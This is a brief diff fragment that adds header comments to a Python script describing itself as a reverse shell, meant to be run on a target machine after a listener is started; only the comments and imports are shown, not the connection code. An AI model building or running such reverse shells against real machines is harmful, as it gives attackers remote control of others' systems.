@@ -1,4 +1,9 @@
 #!/usr/bin/env python3
+
+# Reverse Shell Written by NOCH in Python3 #
+
+# Run this script on a target machine after starting the server listener #
+
 import socket
 import subprocess
 import os
